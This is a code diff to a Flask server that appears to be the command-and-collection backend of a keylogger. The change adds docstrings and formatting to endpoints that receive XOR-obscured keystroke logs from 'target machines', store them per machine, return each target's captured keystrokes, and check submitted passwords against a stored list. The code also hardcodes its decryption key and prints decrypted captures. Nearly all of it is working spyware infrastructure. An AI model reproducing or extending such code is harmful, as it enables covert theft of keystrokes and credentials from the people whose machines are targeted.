@@ -5,19 +5,37 @@ from flask_cors import CORS
 import time
 from dotenv import load_dotenv
 
-
-
-
+# Define the folder where data will be stored
 DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
 
+
 def generate_log_filename():
+    """
+    Generate a log filename based on the current date.
+
+    Returns:
+        str: The generated log filename in the format 'log_YYYY-MM-DD.txt'.
+    """
     return "log_" + time.strftime("%Y-%m-%d") + ".txt"
 
+
+# Initialize the Flask application
 app = Flask('app')
+# Enable Cross-Origin Resource Sharing (CORS) for the app
 CORS(app)
+
 
 @app.route('/api/upload', methods=['POST'])
 def upload():
+    """
+    Handle the upload of log data for a specific machine.
+
+    Expects a JSON payload with 'machine' and 'data' fields.
+    Decrypts the data and appends it to a log file for the specified machine.
+
+    Returns:
+        Response: JSON response indicating success or failure.
+    """
     data = request.get_json()
     print(data)
 
@@ -25,7 +43,8 @@ def upload():
         return jsonify({"error": "Invalid payload"}), 400
 
     machine = data["machine"]
-    load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), '..', '.env'))  # Load environment variables from .env file
+    load_dotenv(
+        dotenv_path=os.path.join(os.path.dirname(__file__), '..', '.env'))  # Load environment variables from .env file
     key = os.getenv("KEY_ENCRYPTION")
     log_data_decrypted = decrypt("secretkey1", data["data"])
     print(f"Decrypted data: {log_data_decrypted}")
@@ -62,19 +81,44 @@ def upload():
 
     return jsonify({"status": "success", "file": file_path, "data": log_data_decrypted}), 200
 
+
 def decrypt(key: str, data: str):
+    """
+    Decrypt the given data using the provided key.
+
+    Args:
+        key (str): The decryption key.
+        data (str): The data to decrypt.
+
+    Returns:
+        str: The decrypted data.
+    """
     decrypted = ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key) + 1)))
     return decrypted
 
 
 @app.route('/api/get_target_machines_list', methods=['GET'])
 def get_target_machines_list():
+    """
+    Get a list of target machines.
+
+    Returns:
+        Response: JSON response containing the list of machines.
+    """
     machines = os.listdir(DATA_FOLDER)
     return jsonify({"machines": machines}), 200
 
 
 @app.route('/api/get_keystrokes', methods=['GET'])
 def get_target_machine_key_strokes():
+    """
+    Get keystrokes for a specific target machine.
+
+    Expects a 'target_machine' query parameter.
+
+    Returns:
+        Response: JSON response containing the keystrokes or an error message.
+    """
     target_machine = request.args.get('target_machine')
     if not target_machine:
         return jsonify({"error": "Missing target_machine parameter"}), 400
@@ -96,16 +140,19 @@ def get_target_machine_key_strokes():
         except json.JSONDecodeError:
             print(f"Warning: Skipping corrupted file {file_path}")
 
-    # # Sort by timestamp (assuming valid timestamps)
-    # try:
-    #     keystrokes.sort(key=lambda x: datetime.strptime(x["timestamp"], "%Y-%m-%d %H:%M:%S"))
-    # except KeyError:
-    #     return jsonify({"error": "Invalid data format in logs"}), 500
-
     return jsonify({"keystrokes": keystrokes}), 200
+
 
 @app.route('/api/check_passwords', methods=['POST'])
 def check_passwords():
+    """
+    Check if the provided passwords exist in the stored passwords file.
+
+    Expects a JSON payload with 'passwords' field.
+
+    Returns:
+        Response: JSON response indicating success or failure.
+    """
     data = request.get_json()
     print(data)
     passwords_file_path = os.path.join(os.path.dirname(__file__), 'passwords.json')
@@ -117,6 +164,7 @@ def check_passwords():
     if data["passwords"] in passwords.values():
         return jsonify({"status": "success"}), 200
     return jsonify({"error": "Password not found"}), 404
+
 
 if __name__ == '__main__':
     app.run(debug=True)
